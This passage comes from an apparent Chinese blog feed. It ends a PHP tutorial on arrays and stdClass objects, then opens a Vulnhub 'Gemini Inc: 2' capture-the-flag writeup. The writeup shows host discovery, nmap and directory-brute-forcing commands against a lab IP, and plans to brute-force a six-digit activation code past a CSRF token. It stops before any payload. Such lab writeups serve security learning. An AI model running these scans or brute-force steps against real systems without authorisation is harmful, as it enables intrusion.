<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="number">10</span>,</span><br><span class="line">    <span class="number">1</span> =&gt; <span class="number">20</span>,</span><br><span class="line">    <span class="number">2</span> =&gt; <span class="number">30</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr1</span> = <span class="keyword">array</span>(<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>);  <span class="comment"># 简写</span></span><br><span class="line"></span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>当数组中的键从 0 开始递增，则可以使用简写</p>
</blockquote>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115193636.png" /></p>
<p>PHP 5.4 中推荐的新的语法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arrayName</span> = [</span><br><span class="line">	key1 =&gt; value1,</span><br><span class="line">	key2 =&gt; value2,</span><br><span class="line">	key3 =&gt; value3,</span><br><span class="line">	...</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="number">10</span>,</span><br><span class="line">    <span class="number">1</span> =&gt; <span class="number">20</span>,</span><br><span class="line">    <span class="number">2</span> =&gt; <span class="number">30</span> </span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr1</span> = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>];</span><br><span class="line"></span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果同上图。</p>
<h2 id="数组的分类">6.2. 数组的分类</h2>
<p>根据键名的类型，主要分为两类：</p>
<ol type="1">
<li><strong>键名全是整数</strong>：索引数组；（数组）</li>
<li><strong>键名全是字符串</strong>：关联数组；（字典）</li>
</ol>
<blockquote>
<p>如果键名不是这两类，则会强制转换。但 PHP
不区分索引数组和关联数组，也就是说，一个数组中的键可以同时存在整数和字符串，但如果出现其他的，则会强制转换。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">    <span class="number">1</span> =&gt; <span class="number">10</span>,</span><br><span class="line">    <span class="number">1.4</span> =&gt; <span class="number">20</span>,</span><br><span class="line">    <span class="literal">true</span> =&gt; <span class="number">30</span>,</span><br><span class="line">    <span class="number">0.3</span> =&gt; <span class="number">40</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115194313.png" /></p>
<p>解释：</p>
<ol type="1">
<li><code>1 =&gt; 10</code> <strong>创建</strong>了键值对
<code>1 =&gt; 10</code>；</li>
<li><code>1.4 =&gt; 20</code>，因为键时浮点数，转为整数（舍弃小数），因此
<code>1 =&gt; 20</code>，所以此时<strong>更新</strong>键值对
<code>1 =&gt; 20</code>；</li>
<li><code>true =&gt; 30</code>，同
<code>1.4 =&gt; 20</code>，<code>true</code> 转换为整数
1，因此<strong>更新</strong>键值对 <code>1 =&gt; 30</code>；</li>
<li>最后 <code>0.3 =&gt; 40</code>，浮点数转为整数 0，创建键值对
<code>0 =&gt; 30</code>；</li>
</ol>
<p>同时存在整数和字符串键名：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;takagi&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">18</span>,</span><br><span class="line">    <span class="number">2</span> =&gt; <span class="number">30</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115194615.png" /></p>
<h2 id="数组的值">6.3. 数组的值</h2>
<p>之前介绍过数组的键，现在介绍数组的值的类型：</p>
<ul>
<li>数组的值可以是任何类型；</li>
<li>如果是 object，则要按照对象方式访问；</li>
<li>如果是 array，则构成了多维数组；</li>
</ul>
<p>多维数组的例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;takagi&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">18</span>,</span><br><span class="line">    <span class="string">&#x27;language&#x27;</span> =&gt; [<span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;JavaScripte&#x27;</span>]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115194850.png" /></p>
<p>值是对象 (object 在后面会说到)：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="built_in">StdClass</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;name = <span class="string">&#x27;Jack&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;takagi&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">18</span>,</span><br><span class="line">    <span class="string">&#x27;language&#x27;</span> =&gt; [<span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;JavaScripte&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;user&#x27;</span> =&gt; <span class="variable">$obj</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line">print_r(<span class="variable">$arr</span>[<span class="string">&#x27;user&#x27;</span>]-&gt;name);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115195034.png" /></p>
<h2 id="数组的增删改查">6.4. 数组的增删改查</h2>
<p><strong>可以使用如下方式访问数组元素：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span>[key]</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;takagi&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">18</span>,</span><br><span class="line">    <span class="string">&#x27;language&#x27;</span> =&gt; [<span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;JavaScripte&#x27;</span>]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115195718.png" /></p>
<p><strong>添加与更新（修改）：</strong></p>
<ol type="1">
<li><code>$arr[] = 'php'</code> ：不指定键名表示追加；</li>
<li><code>$arr[2] = 'java'</code> ：指定键名存在，则更新；</li>
<li><code>$arr[2] = 'java'</code> ：指定键名不存在，则创建；</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;takagi&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">18</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span>[] = <span class="string">&#x27;xian&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;m1ku&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;city&#x27;</span>] = <span class="string">&#x27;fuzhou&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115200036.png" /></p>
<p>可以看到，追加的键名会默认是整数，并且从当前数组已有索引之后开始追加</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;takagi&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">18</span>,</span><br><span class="line">    <span class="number">1</span> =&gt; <span class="number">20</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span>[] = <span class="string">&#x27;xian&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span>[] = <span class="string">&#x27;beijing&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;m1ku&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;city&#x27;</span>] = <span class="string">&#x27;fuzhou&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115200151.png" /></p>
<p><strong>元素的删除：</strong></p>
<ol type="1">
<li><code>unset($arr[key])</code> ：删除单个元素；</li>
<li><code>unset($arr)</code> ：删除整个数组；</li>
<li>将元素逐个销毁，但保持数组本身不变，即数组仍存在；
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">foreach($arr as $key=&gt;$value)&#123; </span><br><span class="line">	unset($arr[$key]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;takagi&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">18</span>,</span><br><span class="line">    <span class="string">&#x27;city&#x27;</span> =&gt; <span class="string">&#x27;Fuzhou&#x27;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;age&#x27;</span>]);</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$arr</span>[<span class="variable">$key</span>]);</span><br><span class="line">&#125;</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115200610.png" /></p>
<p>上面程序介绍了第一种和第三种，接下来介绍第二种：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;takagi&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">18</span>,</span><br><span class="line">    <span class="string">&#x27;city&#x27;</span> =&gt; <span class="string">&#x27;Fuzhou&#x27;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$arr</span>);</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115200703.png" /></p>
<p>整个数组都没了。</p>
<h2 id="数组元素重建索引">6.5. 数组元素重建索引</h2>
<blockquote>
<p>主要针对索引数组。</p>
</blockquote>
<p>使用
<code>$new_arr = array_values($arr)</code>，可以重建索引，生成新的数组；</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="number">10</span>,</span><br><span class="line">    <span class="number">1</span> =&gt; <span class="number">20</span>,</span><br><span class="line">    <span class="number">2</span> =&gt; <span class="number">30</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$arr</span>[<span class="number">1</span>]);</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$arr</span>[] = <span class="number">40</span>;</span><br><span class="line"><span class="variable">$arr</span>[] = <span class="number">50</span>;</span><br><span class="line"><span class="variable">$arr</span>[] = <span class="number">60</span>;</span><br><span class="line"><span class="variable">$arr</span>[] = <span class="number">70</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$new_arr</span> = array_values(<span class="variable">$arr</span>);</span><br><span class="line">print_r(<span class="variable">$new_arr</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115201211.png" /></p>
<h2 id="数组遍历与常用输出方式">6.6. 数组遍历与常用输出方式</h2>
<p>使用
<code>foreach</code>，这是专门用来遍历数组（主要是遍历关联数组），语法如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$key</span> .<span class="string">&#x27;=&gt;&#x27;</span>. <span class="variable">$value</span> .<span class="string">&#x27;&lt;br&gt;&#x27;</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>.'str'</code> 字符串拼接，把 <code>.</code> 看做 Python 中的
<code>+</code>；</p>
</blockquote>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115201420.png" /></p>
<p>常用输出语句介绍：</p>
<table>
<colgroup>
<col style="width: 9%" />
<col style="width: 22%" />
<col style="width: 68%" />
</colgroup>
<thead>
<tr class="header">
<th>语句/函数</th>
<th>标量类型（字面量/变量/常量）</th>
<th>复合类型（数组/对象）</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>echo</code></td>
<td>值</td>
<td>如果是数组，则输出 Array，如果是对象，则无法查看（除非对象中定义了
toString 魔术方法）</td>
</tr>
<tr class="even">
<td><code>print_r()</code></td>
<td>值</td>
<td>格式化输出，加参数 true，输出到字符串（返回值）</td>
</tr>
<tr class="odd">
<td><code>var_dump()</code></td>
<td>类型、值</td>
<td>类型、长度、值</td>
</tr>
</tbody>
</table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="variable">$r</span> = print_r(<span class="variable">$arr</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$r</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115201902.png" /></p>
<ul>
<li><code>print_r</code> 第二个参数为
<code>true</code>，则将结果输出到字符串；</li>
<li><code>print_r</code> 和
<code>var_dump</code>，参数为对象时，仅输出对象属性；</li>
<li><code>echo</code> 和 <code>var_dump</code>
课同时输出多个数据，<code>print_r</code> 仅接受单数据；</li>
<li><code>print</code> 可返回 1 ，除此之外，与 echo 完全一样；</li>
</ul>
<h1 id="object">7. Object</h1>
<h2 id="类演示">7.1. 类演示</h2>
<p>首先得有一个类模板：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 声明属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span> = <span class="string">&#x27;a default value&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>当一个方法在类定义内部被调用时，有一个可用的伪变量
<code>$this</code>。<code>$this</code> 是一个到当前对象的引用。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_info</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;my name: &#x27;</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">&#x27;, age: &#x27;</span>.<span class="keyword">$this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Student;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;name;  <span class="comment"># 属性</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;age;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;get_info();  <span class="comment"># 方法</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115204932.png" /></p>
<blockquote>
<p>如果方法需要参数，需要带上参数。</p>
</blockquote>
<h2 id="标准类">7.2. 标准类</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>();  <span class="comment"># 创建标准类对象</span></span><br><span class="line"><span class="variable">$obj</span>-&gt;name = <span class="string">&#x27;takagi&#x27;</span>;  <span class="comment"># 添加属性</span></span><br><span class="line"><span class="variable">$obj</span>-&gt;server = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;  <span class="comment"># 添加方法，此时使用匿名函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello world.&#x27;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> call_user_func(<span class="variable">$obj</span>-&gt;server);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>需要注意，此时的 <code>$obj-&gt;server</code>
并不是一个方法，而是一个标识符（可以当成是一个属性），如果需要调用该“方法”，需要使用
<code>call_user_func()</code> 告诉 php 这是一个方法。</p>
<p><strong>数组转为对象</strong>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r((<span class="keyword">object</span>)[<span class="number">10</span>, <span class="number">20</span>, <span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115205607.png" /></p>
<p>会自动生成属性名，并以此赋值。</p>
<p><strong>字符串转为对象</strong>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r((<span class="keyword">object</span>)<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115205655.png" /></p>
<p><strong>数字转为对象</strong>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r((<span class="keyword">object</span>)<span class="number">23</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115205714.png" /></p>
<p>可以看到，不论是数字还是字符串，转为对象的时候，都会自动生成一个名为
<code>scalar</code> 的属性。</p>
<p><strong>null 转为对象</strong>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r((<span class="keyword">object</span>)<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115205807.png" /></p>
<p>还是会生成对象，但没有任何属性。</p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php基础</tag>
      </tags>
  </entry>
  <entry>
    <title>20 Vulnhub Gemini_Inc_2 Writeup</title>
    <url>/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度中等，涉及redis相关漏洞。由于WAF的存在，感觉比较贴近现实。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/gemini-inc-2,234/">Gemini
Inc: 2 ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>中 -&gt; 高</li>
</ul>
<p>目标：</p>
<ul>
<li>取得root权限</li>
<li>拿到1个flag</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li><strong>隐藏路径爬取</strong></li>
<li>开放注册</li>
<li><strong>验证码爆破</strong></li>
<li><strong>Anti CSRF Token</strong></li>
<li>密码破解</li>
<li><strong>WAF Bypass</strong></li>
<li><strong>命令注入绕过</strong></li>
<li>SSH公钥认证</li>
<li>Redis漏洞利用</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1.
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 192.168.100.21</span><br><span class="line">sudo nmap -p22,80 -A 192.168.100.21</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503211550.png" /></p>
<p>可以得到的信息很常规。</p>
<h2 id="访问http服务">2.2. 访问http服务</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503211635.png" /></p>
<p>与1不同的是，这里多了一个登录功能，尝试1的账号和密码，发现无法登录。除了这个之外，User
List点进去是空白的页面，然后就没有其他的了。</p>
<p>接下来路径发现： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.100.21/</span><br></pre></td></tr></table></figure></p>
<p>然后对扫描到的路径一一检查，并没有发现有用的信息。（默默bb一句：dirsearch每次都扫不出关键的，因此强烈建议配合dirb和gobuster使用）隐藏路径爬取：（二选一）
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. dirb http://192.168.100.21 -X .php</span><br><span class="line">2. gobuster dir -u http://192.168.100.21/ -w /usr/share/dirb/wordlists/common.txt -x php,html,txt</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503212047.png" /></p>
<p>得到两个新的文件。前者目前还看不懂什么作用，不过从名字来看应该是激活用户的。而后者就是注册新用户的，因此先注册一个用户</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503212349.png" /></p>
<p>点击hack -&gt; My
Profile之后url上回显示出u=17，猜测这是我们新用户的id。</p>
<p>用户需要激活，激活的code是一个6位的纯数字，联想到activate.php，应该就是利用该文件进行激活，code我们并不知道，因此需要爆破。</p>
<p>不过查看activate.php源码发现有一个隐藏的表单</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503212529.png" /></p>
<p>并且每次刷新都不同。随便填入一个code然后抓包发现</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503212732.png" /></p>
<p>会发现这里提交的token和源码中隐藏的token是一样的，并且多尝试提交几次，每次都是如此。合理怀疑这是CSRF
token。这是需要注意的一个点。</p>
<h3 id="方法1">2.2.1. 方法1</h3>
